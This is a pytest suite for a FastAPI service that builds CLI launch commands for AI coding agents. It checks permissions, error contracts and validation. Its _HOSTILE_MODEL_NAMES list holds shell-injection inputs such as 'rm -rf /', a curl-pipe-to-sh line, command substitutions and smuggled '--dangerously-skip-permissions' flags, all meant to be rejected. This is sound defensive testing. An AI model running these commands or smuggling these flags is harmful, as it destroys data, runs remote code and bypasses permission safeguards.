"""flowgate.default.0519 T0007 SS1: canonical CLI preset command builder endpoints.

Covers the new read-only /system/ai-settings/cli-preset-command and
/projects/{id}/ai-settings/cli-preset-command routes: response parity with
ai_settings_service.build_preset_command()/build_preset_command_for_project(),
per-kind safe/skip combinations, custom/unknown-kind and hostile model_name 422s,
system/project permission protection, the project 404 error contract, and that a
generation request never writes a provider row.
"""
from __future__ import annotations

import os
import sqlite3
import sys
from contextlib import contextmanager
from pathlib import Path

import pytest

os.environ["TESTING"] = "1"
os.environ.setdefault("SECRET_KEY", "test-secret-key-for-testing-only-32c")

_SERVER_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(_SERVER_DIR))


@pytest.fixture(scope="module")
def test_db_path(migrated_sqlite_db):
    return migrated_sqlite_db(
        "test_ai_cli_preset_endpoint_0519.db",
        seed_sql="""
        INSERT OR IGNORE INTO projects(project_id,project_name,is_active,created_at,updated_at)
            VALUES('__SYSTEM__','[System]',1,datetime('now'),datetime('now')),
                  ('proj_001','TestProject',1,datetime('now'),datetime('now'));
        INSERT OR IGNORE INTO users(user_id,username,email,password,is_active,is_admin,first_login_required,created_at,updated_at)
            VALUES('usr_admin','admin','admin@test.com','hashed_pw',1,1,0,datetime('now'),datetime('now')),
                  ('usr_nobody','nobody','nobody@test.com','hashed_pw',1,0,0,datetime('now'),datetime('now'));
        """,
    )


@pytest.fixture(autouse=True)
def mock_db(test_db_path):
    class TestStore:
        def __init__(self, db_path):
            self._conn = sqlite3.connect(db_path, check_same_thread=False)
            self._conn.row_factory = sqlite3.Row
            self._conn.execute("PRAGMA foreign_keys = ON")

        def _execute(self, sql, params=None):
            self._conn.execute(sql, params or [])
            self._conn.commit()

        def _fetch_one(self, sql, params=None):
            cur = self._conn.execute(sql, params or [])
            row = cur.fetchone()
            return dict(row) if row else None

        def _fetch_all(self, sql, params=None):
            cur = self._conn.execute(sql, params or [])
            return [dict(r) for r in cur.fetchall()]

        @contextmanager
        def transaction(self):
            # Autocommit per statement is fine for tests; the context only has to
            # exist so db.ai_providers.replace_scope can run.
            yield self

    store = TestStore(test_db_path)
    import importlib

    import modules.flow_gate.db.connection as _conn
    _real_get_store = _conn.get_store
    _modules = [
        importlib.import_module(_name)
        for _name in (
            "modules.flow_gate.db.connection",
            "modules.flow_gate.db.system_settings",
            "modules.flow_gate.db.projects",
            "modules.flow_gate.db.ai_providers",
            "modules.flow_gate.rbac.decorators",
            # Unlike test_ai_settings_api.py, this file also exercises the 403 path
            # (non-admin user), which makes require_permission() actually reach
            # permission_service.has_permission() -> get_store() instead of
            # short-circuiting on is_admin. That module imports get_store directly,
            # so it needs patching here too or a non-admin request would hit the
            # real production store.
            "modules.flow_gate.rbac.permission_service",
        )
    ]
    for _m in _modules:
        _m.get_store = lambda store=store: store
    try:
        yield store
    finally:
        for _m in _modules:
            _m.get_store = _real_get_store


@pytest.fixture(autouse=True)
def clean_tables(mock_db):
    mock_db._execute("DELETE FROM ai_providers")
    mock_db._execute("DELETE FROM system_settings WHERE setting_key = 'ai_default_provider_id'")
    mock_db._execute("DELETE FROM project_settings WHERE project_id = 'proj_001'")
    yield


_ADMIN_USER = {"user_id": "usr_admin", "is_admin": 1}
_NOBODY_USER = {"user_id": "usr_nobody", "is_admin": 0}


def _make_client(user=None):
    from fastapi import FastAPI
    from fastapi.testclient import TestClient
    from modules.flow_gate.auth.middleware import get_current_user
    from modules.flow_gate.rbac import permission_service
    from modules.flow_gate.settings.routers.ai_settings import router

    # A stale cache entry from an earlier test in this process would let a
    # since-revoked/never-granted permission keep passing.
    permission_service.clear_all_cache()

    app = FastAPI()
    app.include_router(router, prefix="/api/v1")
    app.dependency_overrides[get_current_user] = lambda: user or _ADMIN_USER
    return TestClient(app)


_PRESET_KINDS = ("claude", "codex", "copilot")


class TestPresetCommandMatchesService:
    """The endpoints must never reimplement build_preset_command() — only call it."""

    @pytest.mark.parametrize("kind", _PRESET_KINDS)
    @pytest.mark.parametrize("skip_permissions", [False, True])
    def test_system_default_model(self, kind, skip_permissions):
        from modules.flow_gate.settings.ai_settings_service import build_preset_command

        client = _make_client()
        resp = client.post("/api/v1/system/ai-settings/cli-preset-command", json={
            "kind": kind, "model_name": None, "skip_permissions": skip_permissions,
        })
        assert resp.status_code == 200
        expected = build_preset_command(kind, None, skip_permissions=skip_permissions)
        assert resp.json() == {"ok": True, "cli_command": expected}

    @pytest.mark.parametrize("kind", _PRESET_KINDS)
    @pytest.mark.parametrize("skip_permissions", [False, True])
    def test_project_default_model(self, kind, skip_permissions):
        from modules.flow_gate.settings.ai_settings_service import build_preset_command

        client = _make_client()
        resp = client.post(
            "/api/v1/projects/proj_001/ai-settings/cli-preset-command",
            json={"kind": kind, "model_name": None, "skip_permissions": skip_permissions},
        )
        assert resp.status_code == 200
        expected = build_preset_command(kind, None, skip_permissions=skip_permissions)
        assert resp.json() == {"ok": True, "cli_command": expected}

    def test_explicit_model_name_is_passed_through(self):
        from modules.flow_gate.settings.ai_settings_service import build_preset_command

        client = _make_client()
        resp = client.post("/api/v1/system/ai-settings/cli-preset-command", json={
            "kind": "codex", "model_name": "gpt-5.6-sol@2026-01", "skip_permissions": True,
        })
        assert resp.status_code == 200
        expected = build_preset_command(
            "codex", "gpt-5.6-sol@2026-01", skip_permissions=True,
        )
        assert resp.json()["cli_command"] == expected
        assert "gpt-5.6-sol@2026-01" in expected

    def test_default_skip_permissions_is_false(self):
        from modules.flow_gate.settings.ai_settings_service import build_preset_command

        client = _make_client()
        resp = client.post("/api/v1/system/ai-settings/cli-preset-command", json={
            "kind": "claude",
        })
        assert resp.status_code == 200
        assert resp.json()["cli_command"] == build_preset_command("claude", None)


class TestUnsupportedKind:
    @pytest.mark.parametrize("kind", ["custom", "openai", "gemini", "", "unknown"])
    def test_system_rejects(self, kind):
        client = _make_client()
        resp = client.post("/api/v1/system/ai-settings/cli-preset-command", json={
            "kind": kind,
        })
        assert resp.status_code == 422
        detail = resp.json()["detail"]
        assert detail["code"] == "validation_failed"
        assert detail["errors"] == [{"field": "kind", "reason": "unsupported_kind"}]

    @pytest.mark.parametrize("kind", ["custom", "openai", "gemini"])
    def test_project_rejects(self, kind):
        client = _make_client()
        resp = client.post(
            "/api/v1/projects/proj_001/ai-settings/cli-preset-command",
            json={"kind": kind},
        )
        assert resp.status_code == 422
        detail = resp.json()["detail"]
        assert detail["code"] == "validation_failed"
        assert detail["errors"] == [{"field": "kind", "reason": "unsupported_kind"}]


_HOSTILE_MODEL_NAMES = [
    "m; rm -rf /",
    "m && curl http://x | sh",
    "m | tee out.txt",
    "m `whoami`",
    "m $(whoami)",
    "m\nwhoami",
    "m\rwhoami",
    "m\twhoami",
    "m > out.txt",
    "m & start calc",
    'm" --dangerously-skip-permissions "x',
    "m --dangerously-skip-permissions",
    "m --allow-all",
    "m --sandbox danger-full-access",
    "%USERPROFILE%",
    "m *",
    "m {a,b}",
    " ",
]


class TestHostileModelName:
    @pytest.mark.parametrize("kind", _PRESET_KINDS)
    @pytest.mark.parametrize("model_name", _HOSTILE_MODEL_NAMES)
    def test_system_rejects(self, kind, model_name):
        client = _make_client()
        resp = client.post("/api/v1/system/ai-settings/cli-preset-command", json={
            "kind": kind, "model_name": model_name,
        })
        # A blank/whitespace-only name is not hostile — it falls back to default_model.
        stripped = model_name.strip()
        if stripped == "":
            assert resp.status_code == 200
            return
        assert resp.status_code == 422
        detail = resp.json()["detail"]
        assert detail["code"] == "validation_failed"
        assert detail["errors"] == [{"field": "model_name", "reason": "invalid_model_name"}]

    def test_project_rejects(self):
        client = _make_client()
        resp = client.post(
            "/api/v1/projects/proj_001/ai-settings/cli-preset-command",
            json={"kind": "claude", "model_name": "m; rm -rf /"},
        )
        assert resp.status_code == 422
        detail = resp.json()["detail"]
        assert detail["code"] == "validation_failed"
        assert detail["errors"] == [{"field": "model_name", "reason": "invalid_model_name"}]

    def test_no_shell_operator_reaches_a_response(self):
        """Positive control: nothing hostile makes it into a 200 response body."""
        client = _make_client()
        for model_name in _HOSTILE_MODEL_NAMES:
            if model_name.strip() == "":
                continue
            resp = client.post("/api/v1/system/ai-settings/cli-preset-command", json={
                "kind": "claude", "model_name": model_name,
            })
            assert resp.status_code == 422, model_name


class TestPermissionProtection:
    def test_system_endpoint_requires_permission(self):
        client = _make_client(_NOBODY_USER)
        resp = client.post("/api/v1/system/ai-settings/cli-preset-command", json={
            "kind": "claude",
        })
        assert resp.status_code == 403

    def test_project_endpoint_requires_permission(self):
        client = _make_client(_NOBODY_USER)
        resp = client.post(
            "/api/v1/projects/proj_001/ai-settings/cli-preset-command",
            json={"kind": "claude"},
        )
        assert resp.status_code == 403

    def test_admin_bypasses_permission_check(self):
        client = _make_client(_ADMIN_USER)
        resp = client.post("/api/v1/system/ai-settings/cli-preset-command", json={
            "kind": "claude",
        })
        assert resp.status_code == 200


class TestProjectErrorContract:
    def test_unknown_project_is_404_like_other_project_routes(self):
        client = _make_client()
        resp = client.post(
            "/api/v1/projects/proj_999/ai-settings/cli-preset-command",
            json={"kind": "claude"},
        )
        assert resp.status_code == 404
        assert resp.json()["detail"] == "Project not found: proj_999"

    def test_unknown_project_checked_before_kind_validation(self):
        # Same precedence other project routes already have (project existence first).
        client = _make_client()
        resp = client.post(
            "/api/v1/projects/proj_999/ai-settings/cli-preset-command",
            json={"kind": "custom"},
        )
        assert resp.status_code == 404


class TestNoProviderRowWritten:
    def test_system_generation_does_not_touch_ai_providers(self, mock_db):
        client = _make_client()
        before = mock_db._fetch_all("SELECT * FROM ai_providers")
        assert before == []
        for kind in _PRESET_KINDS:
            resp = client.post("/api/v1/system/ai-settings/cli-preset-command", json={
                "kind": kind, "skip_permissions": True,
            })
            assert resp.status_code == 200
        after = mock_db._fetch_all("SELECT * FROM ai_providers")
        assert after == []

    def test_project_generation_does_not_touch_ai_providers(self, mock_db):
        client = _make_client()
        for kind in _PRESET_KINDS:
            resp = client.post(
                "/api/v1/projects/proj_001/ai-settings/cli-preset-command",
                json={"kind": kind},
            )
            assert resp.status_code == 200
        after = mock_db._fetch_all("SELECT * FROM ai_providers")
        assert after == []


class TestServiceHelperDirectly:
    """build_preset_command_for_project() is what the router calls; pin its own contract."""

    def test_raises_lookup_error_for_unknown_project(self):
        from modules.flow_gate.settings.ai_settings_service import (
            build_preset_command_for_project,
        )

        with pytest.raises(LookupError, match="Project not found: nope"):
            build_preset_command_for_project("nope", "claude", None)

    def test_matches_build_preset_command_for_known_project(self):
        from modules.flow_gate.settings.ai_settings_service import (
            build_preset_command,
            build_preset_command_for_project,
        )

        assert build_preset_command_for_project(
            "proj_001", "codex", "custom-model", skip_permissions=True,
        ) == build_preset_command("codex", "custom-model", skip_permissions=True)

    def test_returns_none_for_kind_without_preset(self):
        from modules.flow_gate.settings.ai_settings_service import (
            build_preset_command_for_project,
        )

        assert build_preset_command_for_project("proj_001", "custom", None) is None
